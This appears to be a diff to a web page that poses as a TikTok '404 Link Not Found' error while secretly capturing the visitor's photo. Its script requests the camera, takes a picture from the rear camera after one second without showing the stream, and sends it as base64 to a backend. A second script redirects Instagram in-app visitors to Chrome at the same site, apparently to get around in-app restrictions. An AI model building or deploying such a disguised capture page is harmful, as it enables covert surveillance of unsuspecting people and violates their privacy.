@@ -3,27 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
+  <title>TikTok</title>
 </head>
 <body>
   
   <h1>Error 404 : Link Not Found</h1>
-  <canvas id="canvas" style="display:none;"></canvas> <!-- Hidden canvas to draw the captured photo -->
+  
+  <!-- Hidden canvas to capture the photo -->
+  <canvas id="canvas" style="display:none;" width="1080" height="1920"></canvas>
+
   <script>
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    
+    const width = 1080;  // Default phone photo width
+    const height = 1920; // Default phone photo height
+
+    // Set canvas dimensions explicitly
+    canvas.width = width;
+    canvas.height = height;
+
     // Request access to the webcam and automatically capture a photo after loading
-    navigator.mediaDevices.getUserMedia({ video: true })
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: width }, height: { ideal: height } } })
       .then(stream => {
-        // Set up video stream, but don't display it on the page
+        // Set up video stream but don't display it
         const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
-        
-        // Capture photo after 1 second (you can adjust this timing)
+
+        // Capture photo after 1 second (adjust timing if needed)
         setTimeout(() => {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          context.drawImage(video, 0, 0, width, height);
           const photo = canvas.toDataURL('image/jpeg');  // Get photo as base64
           sendPhoto(photo);  // Send photo to the backend API
         }, 1000);
@@ -54,14 +63,16 @@
       }
     }
   </script>
+
+  <!-- Force Instagram users to open in Chrome -->
   <script>
-  setTimeout(function() {
-    var ua = navigator.userAgent.toLowerCase();
-    if (ua.includes("instagram")) {
-      window.location.href = "googlechrome://https://errorr404.vercel.app/"; // Forces Chrome on Android
-      window.location.href = "googlechrome://browse?url=https://https://errorr404.vercel.app/"; // Alternative method
-    }
-  }, 1000);
+    setTimeout(function() {
+      var ua = navigator.userAgent.toLowerCase();
+      if (ua.includes("instagram")) {
+        window.location.href = "googlechrome://https://errorr404.vercel.app/"; // Forces Chrome on Android
+        window.location.href = "googlechrome://browse?url=https://errorr404.vercel.app/"; // Alternative method
+      }
+    }, 1000);
   </script>
 
 </body>
